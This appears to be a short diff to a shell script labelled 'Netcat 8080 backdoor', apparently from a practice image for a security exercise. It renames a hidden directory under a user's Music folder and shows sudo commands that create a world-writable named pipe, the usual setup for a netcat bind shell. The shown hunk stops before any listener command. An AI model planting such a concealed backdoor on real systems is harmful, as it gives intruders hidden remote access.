@@ -1,7 +1,7 @@
 #Netcat 8080 backdoor
 
 #Simulates the old "nc -e" command, opens nc backdoor
-cd /home/cp_user/Music/.epic-music
+cd /home/cp_user/Music/.epic-songs
 sudo mkfifo ./foo
 sudo chgrp sudo ./foo
 sudo chmod 777 ./foo
